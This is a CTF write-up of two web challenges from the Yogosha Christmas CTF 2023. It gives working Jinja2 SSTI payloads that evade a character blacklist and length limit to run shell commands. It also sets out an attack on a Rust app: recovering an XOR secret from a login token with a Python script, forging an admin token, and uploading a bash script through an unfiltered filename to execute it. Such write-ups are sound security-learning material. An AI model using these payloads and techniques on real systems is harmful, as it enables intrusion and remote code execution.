---
title: Yogosha Christmas CTF 2023
# Summary for listings and search engines
summary: Web Challenges Writeup 
# Link this post with a project
# projects: []

# Date published
date: "2023-01-01T00:00:00Z"

# Date updated
#lastmod: "2020-12-13T00:00:00Z"

# Is this an unpublished draft?
#draft: false

# Show this page in the Featured widget?
featured: false

# Featured image
# Place an image named `featured.jpg/png` in this page's folder and customize its options here.
 
 
 # placement: 2
  #preview_only: false

authors:
- Wassila Chtioui

tags:
- Web Exploitation
- CTF Write-up

categories:
- Web
- CTF
- rust
- md5
- xor
- path traversal
- SSTI

---
# Yogosha Christmas CTF 2023

### Introduction 
Last week I participated in the Yogosha Christmas CTF and ranked 7th. Here is a writeup of the Web challenges I played.  
Enjoy your reading! 😊 


### Down - 440 points  (7 solves)
The idea behind this challenge is to inject an SSTI payload within an email form in order to get RCE. So the steps to do that are the following. 

First, we should understand what characters are not allowed in an email. Reading a bunch of articles I found this one [link](https://stackoverflow.com/questions/2049502/what-characters-are-allowed-in-an-email-address). 

![alt text](https://i.imgur.com/wmFpHS6.png)


We conclude from here the main structure of our payload. ==> The exploit will be in the local part of the email and between double quotes. 

Next, examining the source code we notice two restrictions that are being applied on the input.

1. BLACKLIST = ["{{", "}}", "_", "[", "]", "\\", "args", "form", "'"]
2. len(request.form.get("email")) >  100 

So we checked payloadsallthings and grabbed the shortest payloads: 

    {{cycler.\_\_init\_\_.\_\_globals\_\_.os.popen('id').read() }}

Now how to bypass the filtered characters. We google each blacklisted character and check for possible ways to do this. Here's the result:

* For _**underscore**_ bypassing, we used the **_attr filter_**
* For ***curly brackets*** bypassing, we used ***{% print(expression) %}*** ; the print here will allow us to execute our payload.
* For ***single quote*** and ***"args"*** bypassing, we used ***request.values***

Applying all this, we could have the following payload:

    email="{%print((cycler|attr(request.values.a)|attr(request.values.b)).os.popen(request.values.m).read())%}"@pm.me&a=\_\_init_\_&b=\_\_globals\_\_&m=id

But this will trigger the length check as it exceeds 100 characters, so for an even ***shorter payload*** we used a trick that allows us to include variables within the config object and then use them with just ***config.var_name***. This is done thanks to the *config.update* function available in jinja2. 

    email="{%print(config.update(m=request.values.m))%}"%40gmail.com&m=cat%20flag.txt


> The `config` object refers to the configuration of the environment   
> where the Jinja2 template is being executed. It provides access to   
> various configuration settings and options available within Jinja2   
> templates.

We can then confirm that this was successfully updated within the config object.

![alt text](https://i.imgur.com/0q3wfdW.png)


And finally we change the `request.values` in the previous payload with `config` and get the flag! 

**Final payload:**

    email="{%print((cycler|attr(config.a)|attr(config.b)).os.popen(config.m).read())%}"%40pm.me

![alt text](https://i.imgur.com/2wHqhaI.png)


### Rusta Pasta - 460 points (5 solves)

This one was very interesting. It was my first time solving a Rust challenge, so it took me a little some time to understand the code. 
First, as there was no frontend, I identified the routes to understand the general idea behind this. 

    /register: register a user.
    /login: login with USER role. 
    /songs and /artists: login with USER role
    /convert: Needed login with Admin role


A specific interesting endpoint was located in the `converter.rs` file. 

```rust
pub  async  fn  convert_song(Json(payload):  Json<ConvertSongInput>) ->  impl  IntoResponse {

let  script_path  =  format!(
"{}/scripts/{}",
env::current_dir().unwrap().to_str().unwrap(),
sanitize_filepath(&payload.script_id)
);

let  command  =  Command::new("bash").args([&script_path]).output();
match  command {
Ok(command_done) => {
let  output  =  str::from_utf8(&command_done.stdout).unwrap().to_string();
return (StatusCode::OK, Json(ScriptOutput { output })).into_response();
}

Err(_) =>  StatusCode::BAD_REQUEST.into_response(),
}}

pub  async  fn  list_scripts() ->  impl  IntoResponse {
return (
StatusCode::OK,
Json(ListScripts {
scripts:  vec![
String::from("script1.sh"),
String::from("script2.sh"),
String::from("script3.sh"),
],
}),
);}
```

The following line will be our way to get the flag.

    let  command  =  Command::new("bash").args([&script_path]).output();

This simply allows us to execute bash scripts located within the scripts directory. 
But this endpoint is only used as an admin. Thus the next step is to figure out how can we get admin privileges. 

Let's take a step back and observe 🧘‍♀️ 

We registered with a username `"aadmin"`, an email `"aadmin@email.com"` and password `"aadmin"`. and then when logging in we're given an Authorization token that's Base64 encoded to be used when calling the endpoints. 

Okay, now how's this token generated? let's get back to the code and get the necessary parts for this. 

```rust
let  user_token  =  save_user(&user_struct).unwrap_or_default();
return (
StatusCode::OK,
Json(LoginResponse {
id_token:  user_token,
}),
)  
```

The token was generated when calling the `save_user` function and taking *user_struct* as an input from the user when logging in. We can see also from this part of code, how the *token_admin* was generated for a better understanding.

![alt text](https://i.imgur.com/x6P0p4m.png)


As we can see here, no need to determine the admin password as it isn't being used in the token generation and the *user_struct* will look just like the *admin_struct*. 

   
    username: aadmin
    email: aadmin@gmail.com


All we need to do now is figure out a way to generate the admin token in order to have the permissions needed. Thus let's understand the exact mechanism for this.

```rust
pub  fn  save_user(user_struct:  &UserStruct) ->  Result<String, SessionHandlingErrorKind> {

let  user_des  =  serde_yaml::to_string(&user_struct);
match  user_des {
Ok(user_des) => {
let  base64_value  =  base64::encode(&user_des.trim());
let  user_data  =  generate_uuid(base64_value.clone());
let  path_value  =  format!(
"{}/sessions/{}",
env::current_dir().unwrap().to_str().unwrap(),
user_data.0
);

```

This function will take the username and email from the input, serialize it and then encode it to base64. This value will then be passed to the *generate_uuid* function that will return a tuple. 

```rust
pub  fn  generate_uuid(user_des:  String) -> (String, String) {

let  xor_res  =  xor(
user_des.into_bytes(),
&env::var("SECRET_KEY")
.expect("SECRET_KEY env variable not found")
.into_bytes(),
);

let  x  =  base64::encode(&xor_res);
let  digest  =  md5::compute(x.as_bytes());
(format!("{:x}", digest), x)
}
  
pub  fn  xor(s:  Vec<u8>, key:  &[u8]) ->  Vec<u8> {
let  mut  b  =  key.iter().cycle();
s.into_iter().map(|x|  x  ^  b.next().unwrap()).collect()
}

```

lets break this down:

* The base64 encoded input is converted to bytes and xored with a Secret Key. 
* The resulted value is then encoded to base64 and stored to a variable called `x`.
* This same value is then hashed with *md5*. 
* This function returns both the hash and the base64 before hashing (the result of the xor function).

Aand, if we xored the result of the xor function with the same input we can get the secret key. 

Looking again at the `save_user` function. The function returns an `Ok` variant with the second element (`user_data.1`) of the tuple returned by `generate_uuid` when the file creation and write operations are successful. This value represents the `x` string mentioned in the `generate_uuid` function.

So basically, the token we get when logging in is the result from the xor function encoded in base64 !! 
All we have to do is to xor this value again with the same input values we entered in order to get the secret key and then use this key to generate the admin token. 

For this to be successful, make sure to have the same values type used within the xor operation. For example, the user struct must be in base64 and then to bytes and we must decode the result value obtained (`x`) to have it back to bytes as it was encoded to base64 after the xor operation when returned.  

Here's the script that I wrote in order to get the secret key!

 ```python
import base64

def  xor_base64_strings(encoded_str1, encoded_str2):

# Decode Base64 strings to bytes

bytes_str1 = base64.b64decode(encoded_str1)
bytes_str2 = encoded_str2.encode('utf-8')

# Perform XOR operation between bytes

result_bytes = xor(bytes_str1, bytes_str2)
result = result_bytes.decode('utf-8')
return result

def  xor(bytes_str1, bytes_str2):
return  bytes(x ^ y for x, y in  zip(bytes_str1, bytes_str2))
base64_str1 =  "Uj16CQZVAF9WYGcGK3UgWj4iAUQBVhJVU2IiQFt9DAN8YSNfBzJUQGZzU0ZpNV4VfgkrRlYyDF8="
base64_str2 =  "dXNlcm5hbWU6IGFhZG1pbgplbWFpbDogYWFkbWluQGdtYWlsLmNvbQ=="

result = xor_base64_strings(base64_str1, base64_str2)
print("Result of XOR operation:", result)
```


Now having the secret key value, I just setup the docker locally entered all the infos manually and got the admin token!!

So all that is left is to upload a shell and run it. Actually there was also function *`add-script`* within the converter endpoint that allowed us to upload bash scripts within the same directory but for some reason it wasn't really helpful so I was checking around for possible ways and found that a part of the code in the `songs.rs` file had a function with a comment stating that its for testing purposes. I didn't check that at first because I thought it wasn't part of the challenge 😹 .. I spent tooo much time trying locally then I decided to check it. And here we go, the function `upload_song_file` gave us permission to upload a song and there was no filter applied on the filename. So it was possible to upload a bash file in the scripts directory and then execute it from the `/converter` endpoint. 


```rust
async  fn  upload_song_file(file:  Field<'_>) ->  Result<FileUploadResult, FileUploadResult> {
let  filename  =  file.file_name().unwrap().to_string();
if  !filename.ends_with(".mp3") {
println!("File format is not supported, please use mp3.");
return  Err(BadFormat(String::from(
"File format is not supported, please use mp3.",
)));
} 

let  data  =  file.bytes().await.unwrap();
if  data.len() > MAX_UPLOAD_SIZE {
println!("File is too big");
return  Err(FileTooBig("File is too big".to_string()));
}

let  file_path  =  format!("static/songs/{}", filename);

let  write_result  =  tokio::fs::write(&file_path, &data)
.await
.map_err(|err|  err.to_string());
println!("Writing error");
match  write_result {
Ok(_) =>  Ok(FileSaved(filename, file_path)),
Err(_) =>  Err(FileNotSaved("File wasn't saved".to_string())),

}}

```

The request sent to upload the exploit file was the following: 

![alt text](https://i.imgur.com/6VAGbjq.png)


And here's then how I got the flag!

![alt text](https://i.imgur.com/7hjHZv9.png)



### Conclusion
I liked these two challenges in particular as they were really interesting and I learnt so much from them. Huge kudos to the authors and the CTF organizers. 👏 👏 
